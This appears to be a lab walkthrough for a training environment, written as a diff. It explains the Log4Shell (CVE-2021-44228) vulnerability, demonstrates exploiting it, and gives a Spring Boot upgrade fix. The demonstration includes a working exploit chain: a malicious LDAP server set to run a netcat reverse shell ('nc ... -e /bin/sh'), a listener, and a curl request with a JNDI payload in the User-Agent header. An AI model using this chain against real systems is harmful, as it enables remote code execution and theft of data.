@@ -1,0 +1,47 @@
+Main Information
+
+CVE-2021-44228, also known as Log4shell, is a vulnerability in the popular Java logging library called Log4j that allows a remote attacker to execute arbitrary code on the host.
+
+Mechanics:
+Log4j allowed requests to arbitrary LDAP and JNDI (Java Naming and Directory Interface) servers, which allowed attackers to execute Java code on a server. Log4j uses a templating system that allowed for string substitution, for example converting Text: ${java:version} to Text: Java version 1.8.0. One allowed expression was ${jndi:<lookup>}. So an attacker could request a JNDI lookup through LDAP and then specify an arbitrary URL (${jndi:ldap://maliciious.actor.com/file}) which resolves to a server owned by the attacker, letting them execute code on the host.
+
+Example and Simulaiton:
+The following steps demonstrate one way to exploit Log4shell, which exists in Log4j versions 2.0 to 2.15, with other variations existing until version 2.17.1.
+
+1. On Security-Desk, open three terminals.
+
+2. In the first, run:
+cd Desktop
+unzip JNDI-Injection-Exploit.zip
+java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "nc 172.16.30.6 8083 -e /bin/sh" -A "172.16.30.6"
+
+This starts a malicious LDAP server that will attempt to make any client that contacts it execute the command specified in "-C". It will output three randomly generated strings for Java version 1.7, 1.8, and other. We want the version 1.8 string.
+
+3. In the second, run:
+nc -lvp 8083
+
+This will start a netcat listener that will become our shell.
+
+4. And in the third, run:
+curl -H 'User-Agent: ${jndi:ldap://172.16.30.6:1389/JDK_CHARS}' 172.16.20.11:8080
+where JDK_CHARS is the string of characters from the JDK 1.8 JNDI output
+
+The application running on Dev-Web will use Log4j to log the user-agent of any web request, so by replacing ours with the JNDI lookup request, Log4j will execute the lookup and be exploited, giving us a shell.
+
+5. The second terminal should become a shell on Dev-Web in which you can run a limited set of commands. As a test, you can run the command ‘less /etc/passwd’ to view the contents of the passwd file.
+ NOTE: In this example, the application is running in a Docker container so what can be done is a bit limited. However, the vulnerable application is being run as the root user which gives access to any information stored inside the container including logs, configuration files, etc.  
+
+Suggested fix:
+Update the Log4j version and rebuild the application. In the case of this application, Log4j is provided through Spring Framework, so update Spring Framework to the version with fixed Log4j.
+
+1. On Dev-Web, in /home/playerone/log4shell/build.gradle, update line 2 to:
+id 'org.springframework.boot' version '2.6.4'
+and line 19
+implementation 'org.springframework.boot:spring-boot-starter-log4j2:2.6.4'
+
+2. Then run the following commands to rebuild the Docker container and restart the application:
+cd /home/playerone/log4shell
+docker stop log4shell
+docker rm log4shell
+docker build . -t log4shell
+docker run -p 8080:8080 -d --name log4shell log4shell
